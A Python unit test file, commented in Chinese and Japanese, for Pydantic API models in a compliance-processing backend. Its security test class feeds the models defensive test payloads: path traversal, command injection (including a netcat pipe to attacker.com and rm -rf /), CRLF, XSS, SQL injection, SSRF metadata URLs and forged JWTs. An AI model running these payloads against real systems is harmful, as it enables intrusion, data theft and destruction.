"""
models/api.py 单元测试

测试规格: docs/testing/models/api_tests.md
覆盖率目标: 90%+

测试类别:
  - 正常系: 15 个测试
  - 异常系: 5 个测试
  - 安全测试: 3 个测试
"""

import pytest
import base64
import json
from typing import List
import sys
from pathlib import Path

# 导入被测试模块
project_root = Path(__file__).parent.parent.parent.parent.parent / "platform_python_backend-testing"
sys.path.insert(0, str(project_root))

from app.models.api import ProcessTextFileResponse, Base64TextRequest
from app.models.compliance import ComplianceItem, SourceDocumentInfoModel, RelatedControlMappingModel


class TestProcessTextFileResponseNormal:
    """
    ProcessTextFileResponse 正常系测试

    测试ID: API-001 ~ API-006
    """

    def test_process_text_file_response_minimal(self):
        """
        API-001: ProcessTextFileResponse 最小構成
        覆盖代码行: app/models/api.py:5-8

        测试目的:
          - 验证空列表 + 必须字段可以正常创建
          - 确认 Pydantic v2 模型正常工作
        """
        # Arrange - 准备测试数据
        data = {
            "structured_items": [],
            "message": "処理完了",
            "source_filename": "test.pdf"
        }

        # Act - 执行测试
        response = ProcessTextFileResponse(**data)

        # Assert - 验证结果
        assert response.structured_items == []
        assert response.message == "処理完了"
        assert response.source_filename == "test.pdf"

    def test_process_text_file_response_single_item(self):
        """
        API-002: ProcessTextFileResponse 単一ComplianceItem
        覆盖代码行: app/models/api.py:5-8

        测试目的:
          - 验证包含单个 ComplianceItem 的响应
        """
        # Arrange
        compliance_item = ComplianceItem(
            recommendationId="ITEM-001",
            title="テストコンプライアンス",
            description="説明文",
            category=["セキュリティ"],  # category は List[str]
            severity="high"
        )

        # Act
        response = ProcessTextFileResponse(
            structured_items=[compliance_item],
            message="1件処理完了",
            source_filename="compliance.pdf"
        )

        # Assert
        assert len(response.structured_items) == 1
        assert response.structured_items[0].recommendationId == "ITEM-001"
        assert response.structured_items[0].title == "テストコンプライアンス"

    def test_process_text_file_response_multiple_items(self):
        """
        API-003: ProcessTextFileResponse 複数ComplianceItem
        覆盖代码行: app/models/api.py:5-8

        测试目的:
          - 验证包含多个 ComplianceItem 的响应
        """
        # Arrange
        items = [
            ComplianceItem(
                recommendationId=f"ITEM-{i:03d}",
                title=f"コンプライアンス{i}",
                description=f"説明{i}",
                category=["セキュリティ"],  # category は List[str]
                severity="high" if i % 2 == 0 else "medium"
            )
            for i in range(1, 6)
        ]

        # Act
        response = ProcessTextFileResponse(
            structured_items=items,
            message="5件処理完了",
            source_filename="multi_compliance.pdf"
        )

        # Assert
        assert len(response.structured_items) == 5
        assert all(item.recommendationId.startswith("ITEM-") for item in response.structured_items)

    def test_process_text_file_response_full_compliance_item(self):
        """
        API-004: ProcessTextFileResponse 完全構成ComplianceItem
        覆盖代码行: app/models/api.py:5-8

        测试目的:
          - 验证完整的 ComplianceItem（包含所有可选字段）
        """
        # Arrange
        full_item = ComplianceItem(
            recommendationId="FULL-001",
            title="完全なコンプライアンス項目",
            description="詳細な説明文",
            category=["データ保護", "セキュリティ"],  # category は List[str]
            severity="critical",
            references=["https://example.com/doc1", "https://example.com/doc2"],
            rationale="データ保護のため",
            impact="高リスク"
        )

        # Act
        response = ProcessTextFileResponse(
            structured_items=[full_item],
            message="完全な項目を処理",
            source_filename="full_compliance.pdf"
        )

        # Assert
        assert response.structured_items[0].category == ["データ保護", "セキュリティ"]
        assert len(response.structured_items[0].references) == 2
        assert response.structured_items[0].severity == "critical"

    def test_process_text_file_response_japanese_message(self):
        """
        API-012: ProcessTextFileResponse 日本語メッセージ
        覆盖代码行: app/models/api.py:5-8

        测试目的:
          - 验证日文消息的正确处理
        """
        # Arrange
        japanese_messages = [
            "正常に処理されました",
            "エラーが発生しました：ファイルが見つかりません",
            "警告：一部のデータを処理できませんでした"
        ]

        # Act & Assert
        for msg in japanese_messages:
            response = ProcessTextFileResponse(
                structured_items=[],
                message=msg,
                source_filename="test.pdf"
            )
            assert response.message == msg

    def test_process_text_file_response_nested_compliance(self):
        """
        API-014: ProcessTextFileResponse ネストしたComplianceItem
        覆盖代码行: app/models/api.py:5-8

        测试目的:
          - 验证包含 sourceDocument 的嵌套 ComplianceItem
        """
        # Arrange
        source_doc = SourceDocumentInfoModel(
            filename="security_policy.pdf",  # 必須フィールド
            type="Security Policy",
            version="v2.0"
        )

        item = ComplianceItem(
            recommendationId="NESTED-001",
            title="ネストされた項目",
            description="ソースドキュメント付き",
            category=["セキュリティ"],  # category は List[str]
            severity="high",
            sourceDocument=source_doc
        )

        # Act
        response = ProcessTextFileResponse(
            structured_items=[item],
            message="ネスト処理完了",
            source_filename="nested.pdf"
        )

        # Assert
        assert response.structured_items[0].sourceDocument is not None
        assert response.structured_items[0].sourceDocument.filename == "security_policy.pdf"


class TestBase64TextRequestNormal:
    """
    Base64TextRequest 正常系测试

    测试ID: API-005 ~ API-013
    """

    def test_base64_text_request_minimal(self):
        """
        API-005: Base64TextRequest 最小構成
        覆盖代码行: app/models/api.py:10-13

        测试目的:
          - 验证最小配置（无 session_id）
          - 确认 session_id 默认为 None
        """
        # Arrange
        test_content = "テストコンテンツ"
        base64_content = base64.b64encode(test_content.encode('utf-8')).decode('utf-8')

        # Act
        request = Base64TextRequest(
            filename="test.txt",
            file_content_base64=base64_content
        )

        # Assert
        assert request.filename == "test.txt"
        assert request.file_content_base64 == base64_content
        assert request.session_id is None  # デフォルト値確認

    def test_base64_text_request_with_session_id(self):
        """
        API-006: Base64TextRequest session_id付き
        覆盖代码行: app/models/api.py:10-13

        测试目的:
          - 验证包含 session_id 的请求
        """
        # Arrange
        test_content = "セッション付きコンテンツ"
        base64_content = base64.b64encode(test_content.encode('utf-8')).decode('utf-8')
        session_id = "session_12345"

        # Act
        request = Base64TextRequest(
            filename="session_test.txt",
            file_content_base64=base64_content,
            session_id=session_id
        )

        # Assert
        assert request.filename == "session_test.txt"
        assert request.session_id == session_id

    def test_base64_text_request_empty_session_id(self):
        """
        API-007: Base64TextRequest 空session_id
        覆盖代码行: app/models/api.py:10-13

        测试目的:
          - 验证空字符串 session_id 的处理
        """
        # Arrange
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act
        request = Base64TextRequest(
            filename="empty_session.txt",
            file_content_base64=base64_content,
            session_id=""
        )

        # Assert
        assert request.session_id == ""  # 空文字列が保持される

    def test_base64_text_request_large_content(self):
        """
        API-011: Base64TextRequest 大きなBase64コンテンツ
        覆盖代码行: app/models/api.py:10-13

        测试目的:
          - 验证大文件（1MB）的处理
        """
        # Arrange - 生成 1MB 的内容
        large_content = "A" * (1024 * 1024)  # 1MB
        base64_content = base64.b64encode(large_content.encode('utf-8')).decode('utf-8')

        # Act
        request = Base64TextRequest(
            filename="large_file.txt",
            file_content_base64=base64_content
        )

        # Assert
        assert len(request.file_content_base64) > 1024 * 1024
        # デコードして元のサイズ確認
        decoded = base64.b64decode(request.file_content_base64).decode('utf-8')
        assert len(decoded) == 1024 * 1024

    def test_base64_text_request_japanese_filename(self):
        """
        API-013: Base64TextRequest 日本語ファイル名
        覆盖代码行: app/models/api.py:10-13

        测试目的:
          - 验证日文文件名的处理
        """
        # Arrange
        japanese_filenames = [
            "テストファイル.txt",
            "レポート_2024年度.pdf",
            "データ分析結果.xlsx"
        ]
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act & Assert
        for filename in japanese_filenames:
            request = Base64TextRequest(
                filename=filename,
                file_content_base64=base64_content
            )
            assert request.filename == filename


class TestModelOperations:
    """
    モデル操作テスト (Pydantic v2 API)

    测试ID: API-008 ~ API-010, API-015
    """

    def test_model_dump_dict_conversion(self):
        """
        API-008: model_dump 辞書変換検証
        覆盖代码行: app/models/api.py:5-13

        测试目的:
          - 验证 Pydantic v2 的 model_dump() 方法
        """
        # Arrange
        response = ProcessTextFileResponse(
            structured_items=[],
            message="テスト",
            source_filename="test.pdf"
        )

        request = Base64TextRequest(
            filename="test.txt",
            file_content_base64="dGVzdA=="
        )

        # Act
        response_dict = response.model_dump()
        request_dict = request.model_dump()

        # Assert
        assert isinstance(response_dict, dict)
        assert response_dict["message"] == "テスト"
        assert response_dict["source_filename"] == "test.pdf"

        assert isinstance(request_dict, dict)
        assert request_dict["filename"] == "test.txt"
        assert request_dict["session_id"] is None

    def test_model_validate_from_dict(self):
        """
        API-009: model_validate 辞書からの生成
        覆盖代码行: app/models/api.py:5-13

        测试目的:
          - 验证 Pydantic v2 的 model_validate() 方法
        """
        # Arrange
        response_data = {
            "structured_items": [],
            "message": "辞書から生成",
            "source_filename": "dict_test.pdf"
        }

        request_data = {
            "filename": "dict_test.txt",
            "file_content_base64": "ZGljdF90ZXN0",
            "session_id": "session_dict"
        }

        # Act
        response = ProcessTextFileResponse.model_validate(response_data)
        request = Base64TextRequest.model_validate(request_data)

        # Assert
        assert response.message == "辞書から生成"
        assert request.session_id == "session_dict"

    def test_json_round_trip(self):
        """
        API-010: JSON往復変換テスト
        覆盖代码行: app/models/api.py:5-13

        测试目的:
          - 验证 model_dump_json → model_validate_json 的往返转换
        """
        # Arrange
        original_request = Base64TextRequest(
            filename="json_test.txt",
            file_content_base64="anNvbl90ZXN0",
            session_id="json_session"
        )

        # Act - JSON へ変換
        json_str = original_request.model_dump_json()

        # JSON から復元
        restored_request = Base64TextRequest.model_validate_json(json_str)

        # Assert - データが一致する
        assert restored_request.filename == original_request.filename
        assert restored_request.file_content_base64 == original_request.file_content_base64
        assert restored_request.session_id == original_request.session_id

    def test_model_dump_by_alias(self):
        """
        API-015: model_dump by_aliasパラメータ検証
        覆盖代码行: app/models/api.py:5-13

        测试目的:
          - 验证 by_alias 参数的行为（虽然这些模型没有别名，但要测试API）
        """
        # Arrange
        request = Base64TextRequest(
            filename="alias_test.txt",
            file_content_base64="YWxpYXM=",
            session_id="alias_session"
        )

        # Act
        dict_without_alias = request.model_dump(by_alias=False)
        dict_with_alias = request.model_dump(by_alias=True)

        # Assert - alias がないため同じ結果
        assert dict_without_alias == dict_with_alias
        assert "filename" in dict_without_alias
        assert "file_content_base64" in dict_without_alias


class TestProcessTextFileResponseErrors:
    """
    ProcessTextFileResponse 異常系テスト

    测试ID: API-E01 ~ API-E02
    """

    def test_process_text_file_response_missing_required(self):
        """
        API-E01: ProcessTextFileResponse 必須フィールド欠落
        覆盖代码行: app/models/api.py:5-8

        测试目的:
          - 验证缺少必填字段时抛出 ValidationError
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        # structured_items 欠落
        with pytest.raises(ValidationError) as exc_info:
            ProcessTextFileResponse(
                message="テスト",
                source_filename="test.pdf"
            )
        assert "structured_items" in str(exc_info.value)

        # message 欠落
        with pytest.raises(ValidationError) as exc_info:
            ProcessTextFileResponse(
                structured_items=[],
                source_filename="test.pdf"
            )
        assert "message" in str(exc_info.value)

        # source_filename 欠落
        with pytest.raises(ValidationError) as exc_info:
            ProcessTextFileResponse(
                structured_items=[],
                message="テスト"
            )
        assert "source_filename" in str(exc_info.value)

    def test_process_text_file_response_invalid_type(self):
        """
        API-E02: ProcessTextFileResponse 無効な型
        覆盖代码行: app/models/api.py:5-8

        测试目的:
          - 验证错误类型的字段会抛出 ValidationError
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        # structured_items が文字列（リストではない）
        with pytest.raises(ValidationError):
            ProcessTextFileResponse(
                structured_items="not_a_list",
                message="テスト",
                source_filename="test.pdf"
            )

        # message が数値
        with pytest.raises(ValidationError):
            ProcessTextFileResponse(
                structured_items=[],
                message=12345,
                source_filename="test.pdf"
            )


class TestBase64TextRequestErrors:
    """
    Base64TextRequest 異常系テスト

    测试ID: API-E03 ~ API-E05
    """

    def test_base64_text_request_missing_filename(self):
        """
        API-E03: Base64TextRequest filename欠落
        覆盖代码行: app/models/api.py:10-13

        测试目的:
          - 验证缺少 filename 时抛出 ValidationError
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        with pytest.raises(ValidationError) as exc_info:
            Base64TextRequest(
                file_content_base64="dGVzdA=="
            )
        assert "filename" in str(exc_info.value)

    def test_base64_text_request_missing_content(self):
        """
        API-E04: Base64TextRequest file_content欠落
        覆盖代码行: app/models/api.py:10-13

        测试目的:
          - 验证缺少 file_content_base64 时抛出 ValidationError
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        with pytest.raises(ValidationError) as exc_info:
            Base64TextRequest(
                filename="test.txt"
            )
        assert "file_content_base64" in str(exc_info.value)

    def test_base64_text_request_invalid_type(self):
        """
        API-E05: Base64TextRequest 無効な型
        覆盖代码行: app/models/api.py:10-13

        测试目的:
          - 验证错误类型的字段会抛出 ValidationError
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        # filename が数値
        with pytest.raises(ValidationError):
            Base64TextRequest(
                filename=12345,
                file_content_base64="dGVzdA=="
            )

        # file_content_base64 がリスト
        with pytest.raises(ValidationError):
            Base64TextRequest(
                filename="test.txt",
                file_content_base64=["not", "string"]
            )

    def test_response_all_fields_missing(self):
        """
        API-E05: ProcessTextFileResponse 全フィールド欠落

        测试目的:
          - 验证所有必填字段都缺失时抛出 ValidationError
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        with pytest.raises(ValidationError) as exc_info:
            ProcessTextFileResponse()

        # 验证错误信息包含所有 3 个必填字段
        errors = exc_info.value.errors()
        assert len(errors) == 3  # structured_items, message, source_filename

        error_fields = {e['loc'][0] for e in errors}
        assert 'structured_items' in error_fields
        assert 'message' in error_fields
        assert 'source_filename' in error_fields

    def test_request_all_fields_missing(self):
        """
        API-E08: Base64TextRequest 全フィールド欠落

        测试目的:
          - 验证所有必填字段都缺失时抛出 ValidationError
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        with pytest.raises(ValidationError) as exc_info:
            Base64TextRequest()

        # 验证错误信息包含所有 2 个必填字段
        errors = exc_info.value.errors()
        assert len(errors) == 2  # filename, file_content_base64

        error_fields = {e['loc'][0] for e in errors}
        assert 'filename' in error_fields
        assert 'file_content_base64' in error_fields

    def test_response_message_wrong_type(self):
        """
        API-E10: ProcessTextFileResponse message型不正

        测试目的:
          - 单独验证 message 字段的类型错误
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        # message が int
        with pytest.raises(ValidationError) as exc_info:
            ProcessTextFileResponse(
                structured_items=[],
                message=12345,  # int instead of str
                source_filename="test.pdf"
            )

        errors = exc_info.value.errors()
        assert any('message' in str(e) for e in errors)

        # message が list
        with pytest.raises(ValidationError):
            ProcessTextFileResponse(
                structured_items=[],
                message=["list", "not", "string"],
                source_filename="test.pdf"
            )

    def test_response_source_filename_wrong_type(self):
        """
        API-E11: ProcessTextFileResponse source_filename型不正

        测试目的:
          - 单独验证 source_filename 字段的类型错误
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        # source_filename が list
        with pytest.raises(ValidationError) as exc_info:
            ProcessTextFileResponse(
                structured_items=[],
                message="test",
                source_filename=["list", "not", "string"]
            )

        errors = exc_info.value.errors()
        assert any('source_filename' in str(e) for e in errors)

        # source_filename が int
        with pytest.raises(ValidationError):
            ProcessTextFileResponse(
                structured_items=[],
                message="test",
                source_filename=123456
            )

    def test_request_file_content_base64_wrong_type(self):
        """
        API-E12: Base64TextRequest file_content_base64型不正

        测试目的:
          - 单独验证 file_content_base64 字段的类型错误
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        # file_content_base64 が int
        with pytest.raises(ValidationError) as exc_info:
            Base64TextRequest(
                filename="test.txt",
                file_content_base64=99999
            )

        errors = exc_info.value.errors()
        assert any('file_content_base64' in str(e) for e in errors)

        # file_content_base64 が dict
        with pytest.raises(ValidationError):
            Base64TextRequest(
                filename="test.txt",
                file_content_base64={"not": "string"}
            )

    def test_request_session_id_wrong_type(self):
        """
        API-E13: Base64TextRequest session_id型不正

        测试目的:
          - 单独验证 session_id 字段的类型错误
        """
        # Arrange & Act & Assert
        from pydantic import ValidationError

        # session_id が int
        with pytest.raises(ValidationError) as exc_info:
            Base64TextRequest(
                filename="test.txt",
                file_content_base64="dGVzdA==",
                session_id=12345
            )

        errors = exc_info.value.errors()
        assert any('session_id' in str(e) for e in errors)

        # session_id が list
        with pytest.raises(ValidationError):
            Base64TextRequest(
                filename="test.txt",
                file_content_base64="dGVzdA==",
                session_id=["not", "string"]
            )


@pytest.mark.security
class TestBase64TextRequestSecurity:
    """
    Base64TextRequest セキュリティテスト

    测试ID: API-SEC-01 ~ API-SEC-03

    注意: これらのテストはモデル自体のセキュリティではなく、
         使用側のコードで実装すべきセキュリティ対策の警告です。
    """

    def test_base64_request_path_traversal_warning(self):
        """
        API-SEC-01: Path Traversal 警告

        测试目的:
          - 确认模型接受包含路径遍历字符的文件名
          - 警告：使用时必须在上层验证
        """
        # Arrange
        dangerous_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "test/../../../secret.txt"
        ]
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act & Assert - モデルは受け入れる（上位層で検証が必要）
        for filename in dangerous_filenames:
            request = Base64TextRequest(
                filename=filename,
                file_content_base64=base64_content
            )
            assert request.filename == filename

            # 警告: 実際の使用では os.path.basename() を使用すべき
            # safe_filename = os.path.basename(request.filename)

    def test_base64_request_command_injection_warning(self):
        """
        API-SEC-02: Command Injection 警告

        测试目的:
          - 确认模型接受包含命令注入字符的文件名
          - 警告：subprocess 等で使用厳禁
        """
        # Arrange
        dangerous_filenames = [
            "test.txt; rm -rf /",
            "test.txt && cat /etc/passwd",
            "test.txt | nc attacker.com 1234"
        ]
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act & Assert - モデルは受け入れる
        for filename in dangerous_filenames:
            request = Base64TextRequest(
                filename=filename,
                file_content_base64=base64_content
            )
            assert request.filename == filename

            # 警告: subprocess.run() 等で filename を使用してはいけない

    def test_base64_request_crlf_injection_warning(self):
        """
        API-SEC-03: CRLF Injection 警告

        测试目的:
          - 确认模型接受包含 CRLF 字符的文件名
          - 警告：HTTP ヘッダーに設定する前に除去が必要
        """
        # Arrange
        dangerous_filenames = [
            "test.txt\r\nContent-Type: text/html",
            "test.txt\r\n\r\n<script>alert('XSS')</script>",
            "test.txt\nSet-Cookie: sessionid=malicious"
        ]
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act & Assert - モデルは受け入れる
        for filename in dangerous_filenames:
            request = Base64TextRequest(
                filename=filename,
                file_content_base64=base64_content
            )
            assert "\r\n" in request.filename or "\n" in request.filename

            # 警告: HTTP レスポンスヘッダーに設定する前に \r\n を除去すべき
            # safe_filename = request.filename.replace('\r', '').replace('\n', '')

    def test_null_byte_injection_filename(self):
        """
        API-SEC-04: NULLバイトインジェクション

        OWASP A03: Injection

        测试目的:
          - 确认模型接受包含 NULL 字节的文件名
          - 警告：某些系统会在 NULL 字节处截断文件名
        """
        # Arrange
        malicious_filename = "safe.txt\x00.exe"
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act
        request = Base64TextRequest(
            filename=malicious_filename,
            file_content_base64=base64_content
        )

        # Assert - Pydantic 接受包含 NULL 字节的字符串
        assert "\x00" in request.filename
        # 警告: 文件保存前必须移除 NULL 字节
        # safe_filename = request.filename.replace('\x00', '')

    def test_xss_payload_in_message(self):
        """
        API-SEC-05: XSSペイロード

        OWASP A03: Injection

        测试目的:
          - 确认模型接受包含 XSS payload 的字符串
          - 警告：响应时必须进行 HTML 转义
        """
        # Arrange
        xss_payload = "<script>alert('XSS')</script>"
        xss_in_title = "<img src=x onerror=alert('XSS')>"

        item = ComplianceItem(
            recommendationId="REC-XSS",
            title=xss_in_title,
            description=xss_payload
        )

        # Act
        response = ProcessTextFileResponse(
            structured_items=[item],
            message=xss_payload,
            source_filename="test.pdf"
        )

        # Assert - Pydantic 接受原始 HTML/JS 代码
        assert response.message == xss_payload
        assert response.structured_items[0].title == xss_in_title
        assert response.structured_items[0].description == xss_payload
        # 警告: フロントエンド表示時に HTML エスケープが必要
        # escaped = html.escape(response.message)

    def test_invalid_base64_content(self):
        """
        API-SEC-06: 不正なBase64文字列

        OWASP A02: Cryptographic Failures

        测试目的:
          - 确认模型不验证 Base64 格式
          - 警告：解码时需要错误处理
        """
        # Arrange
        invalid_base64_strings = [
            "Not!Valid@Base64#Content$",
            "こんにちは",  # 日文字符
            "+++===***",   # 无效字符
            "A"            # 长度不正确
        ]

        # Act & Assert
        for invalid_base64 in invalid_base64_strings:
            request = Base64TextRequest(
                filename="test.txt",
                file_content_base64=invalid_base64
            )

            # 模型接受任何字符串
            assert request.file_content_base64 == invalid_base64

            # 验证实际解码会失败
            with pytest.raises(Exception):
                base64.b64decode(request.file_content_base64, validate=True)

        # 警告: デコード時に try-except が必要

    def test_sql_injection_session_id(self):
        """
        API-SEC-07: session_id SQLインジェクション

        OWASP A03: Injection

        测试目的:
          - 确认模型接受包含 SQL 注入的 session_id
          - 警告：数据库操作必须使用参数化查询
        """
        # Arrange
        sql_injections = [
            "'; DROP TABLE sessions; --",
            "1' OR '1'='1",
            "admin'--",
            "'; DELETE FROM users WHERE 1=1; --"
        ]
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act & Assert
        for sql_injection in sql_injections:
            request = Base64TextRequest(
                filename="test.txt",
                file_content_base64=base64_content,
                session_id=sql_injection
            )

            # 模型接受任何字符串
            assert request.session_id == sql_injection

        # 警告: DB 操作時にパラメータ化クエリを使用すること
        # cursor.execute("SELECT * FROM sessions WHERE id = ?", (request.session_id,))

    @pytest.mark.slow
    def test_large_string_dos(self):
        """
        API-SEC-08: 巨大文字列入力によるDoS

        OWASP A05: Security Misconfiguration

        测试目的:
          - 确认模型接受大字符串（可能导致 DoS）
          - 警告：应在中间件层设置请求大小限制
        """
        # Arrange - 生成 10MB 的字符串
        large_content = "A" * (10 * 1024 * 1024)  # 10MB

        # Act
        request = Base64TextRequest(
            filename="large.txt",
            file_content_base64=large_content
        )

        # Assert - 模型接受大字符串
        assert len(request.file_content_base64) == 10 * 1024 * 1024

        # 警告: 本番環境では以下の対策が必要:
        # 1. FastAPI/Starlette のリクエストボディサイズ制限
        # 2. Nginx/Apache のクライアント最大ボディサイズ設定
        # 3. カスタムミドルウェアでの検証

    def test_session_id_jwt_signature_tampering(self):
        """
        API-SEC-07: session_id JWT署名改ざん検出

        OWASP A07: Identification and Authentication Failures

        测试目的:
          - 确认模型接受被篡改的 JWT
          - 警告：认证中间件必须验证 JWT 签名
        """
        # Arrange
        # 警告: 这个 JWT 的签名已被篡改
        tampered_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9.TAMPERED_SIGNATURE"
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act
        request = Base64TextRequest(
            filename="test.txt",
            file_content_base64=base64_content,
            session_id=tampered_jwt
        )

        # Assert - 模型接受任何字符串
        assert request.session_id == tampered_jwt
        # 警告: 認証ミドルウェアで jwt.decode() 時に署名検証エラーが発生すべき
        # import jwt
        # with pytest.raises(jwt.InvalidSignatureError):
        #     jwt.decode(request.session_id, "secret", algorithms=["HS256"])

    def test_opensearch_injection_in_filename(self):
        """
        API-SEC-08: filename内のOpenSearchクエリインジェクション

        OWASP A03: Injection

        测试目的:
          - 确认 filename 可能包含 OpenSearch 查询
          - 警告：使用前必须转义或验证
        """
        # Arrange
        opensearch_payloads = [
            '{"query": {"match_all": {}}}',
            '{"script": {"source": "malicious code"}}',
            '*" OR 1=1 --',
            '../_search?source={"query":{"match_all":{}}}'
        ]
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act & Assert
        for payload in opensearch_payloads:
            request = Base64TextRequest(
                filename=payload,
                file_content_base64=base64_content
            )

            # 模型接受任何字符串
            assert request.filename == payload

        # 警告: OpenSearch クエリに filename を使用する前にエスケープ処理が必須
        # from opensearchpy.helpers import escape
        # safe_filename = escape(request.filename)

    def test_ssrf_url_in_filename(self):
        """
        API-SEC-09: SSRF URL in filename

        OWASP A10: Server-Side Request Forgery

        测试目的:
          - 确认 filename 可能包含内部 URL
          - 警告：不能直接用于 HTTP 请求
        """
        # Arrange
        ssrf_urls = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://localhost:8080/admin",  # 内部管理端口
            "http://127.0.0.1:6379/",  # Redis
            "file:///etc/passwd",  # File protocol
            "http://[::1]:8080/secret"  # IPv6 localhost
        ]
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act & Assert
        for url in ssrf_urls:
            request = Base64TextRequest(
                filename=url,
                file_content_base64=base64_content
            )

            # 模型接受任何字符串
            assert request.filename == url

        # 警告: filename を URL として使用する前に以下を確認:
        # 1. URL のスキーマを検証（http/https のみ許可）
        # 2. ホワイトリストと照合
        # 3. 内部 IP アドレスへのアクセスを禁止
        # 4. リダイレクトを制限

    def test_session_id_jwt_alg_none_attack(self):
        """
        API-SEC-12: JWT alg=none攻撃

        OWASP A07: Identification and Authentication Failures

        测试目的:
          - 确认模型接受 alg=none 的 JWT
          - 警告：JWT 验证时必须明确指定算法
        """
        # Arrange
        # 警告: 这个 JWT 使用 alg=none，没有签名
        alg_none_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act
        request = Base64TextRequest(
            filename="test.txt",
            file_content_base64=base64_content,
            session_id=alg_none_jwt
        )

        # Assert - 模型接受任何字符串
        assert request.session_id == alg_none_jwt

        # 警告: JWT デコード時に algorithms パラメータを明示的に指定すること
        # ❌ 間違い: jwt.decode(token, key, verify=True)  # alg=none を受け入れる
        # ✅ 正しい: jwt.decode(token, key, algorithms=["HS256"])  # alg=none を拒否

    def test_unicode_normalization_attack(self):
        """
        API-SEC-13: Unicode正規化攻撃

        OWASP A03: Injection

        测试目的:
          - 确认模型接受外观相似的 Unicode 字符
          - 警告：可能导致 homograph 攻击
        """
        # Arrange
        # 使用外观相似的字符（Homograph attack）
        confusable_filenames = [
            "аdmin.txt",  # 'a' 是西里尔字母（Cyrillic）
            "ｐａｙｐａｌ.txt",  # 全角字符
            "micro\u00adsoft.txt",  # 包含软连字符（U+00AD）
            "gооgle.txt",  # 'o' 是西里尔字母
            "аррӏе.txt"  # 多个西里尔字母
        ]
        base64_content = base64.b64encode(b"content").decode('utf-8')

        # Act & Assert
        for filename in confusable_filenames:
            request = Base64TextRequest(
                filename=filename,
                file_content_base64=base64_content
            )

            # 模型接受任何 Unicode 字符串
            assert request.filename == filename

        # 警告: ファイル名の表示・比較前に Unicode 正規化を実施:
        # import unicodedata
        # normalized = unicodedata.normalize('NFKC', request.filename)
        #
        # セキュリティチェック:
        # 1. 混合スクリプト検出（Latin + Cyrillic など）
        # 2. 制御文字の除去
        # 3. ホワイトリスト検証

    def test_extra_fields_ignored(self):
        """
        API-SEC-14: 未定義フィールドの無視（extra）

        OWASP A08: Software and Data Integrity Failures

        测试目的:
          - 确认 Pydantic 配置正确处理额外字段
          - 验证 extra="forbid" 或 extra="ignore" 行为
        """
        # Arrange
        data_with_extra_fields = {
            "filename": "test.txt",
            "file_content_base64": "dGVzdA==",
            "malicious_field": "this_should_be_ignored",
            "is_admin": True,  # 尝试权限提升
            "bypass_validation": True
        }

        # Act
        try:
            request = Base64TextRequest.model_validate(data_with_extra_fields)

            # Assert - 额外字段应该被忽略或拒绝
            assert request.filename == "test.txt"
            assert request.file_content_base64 == "dGVzdA=="

            # 验证额外字段没有被设置
            assert not hasattr(request, 'malicious_field')
            assert not hasattr(request, 'is_admin')
            assert not hasattr(request, 'bypass_validation')

        except ValidationError:
            # 如果模型配置为 extra="forbid"，会抛出 ValidationError
            # 这也是可接受的行为
            pass

        # 注意: Pydantic v2 默认 extra="ignore"
        # 如果需要拒绝额外字段，在模型中设置:
        # model_config = ConfigDict(extra="forbid")

    def test_business_logic_inconsistency(self):
        """
        API-SEC-15: ビジネスロジック不整合

        OWASP A04: Insecure Design

        测试目的:
          - 确认模型不验证业务逻辑一致性
          - 警告：需要在应用层验证
        """
        # Arrange & Act
        # 场景 1: 空列表但成功消息说有 100 个项目
        inconsistent_response_1 = ProcessTextFileResponse(
            structured_items=[],
            message="Successfully processed 100 items",
            source_filename="test.pdf"
        )

        # Assert - Pydantic 不验证业务逻辑
        assert len(inconsistent_response_1.structured_items) == 0
        assert "100 items" in inconsistent_response_1.message

        # 场景 2: 有项目但消息说没有找到
        item = ComplianceItem(
            recommendationId="REC-001",
            title="Test"
        )
        inconsistent_response_2 = ProcessTextFileResponse(
            structured_items=[item],
            message="No compliance items found",
            source_filename="test.pdf"
        )

        # Assert - Pydantic 不验证业务逻辑
        assert len(inconsistent_response_2.structured_items) == 1
        assert "No compliance items found" in inconsistent_response_2.message

        # 警告: ビジネスロジックの整合性チェックはアプリケーション層で実装:
        # if len(response.structured_items) == 0:
        #     assert "0" in response.message or "No" in response.message
        # else:
        #     count = len(response.structured_items)
        #     assert str(count) in response.message

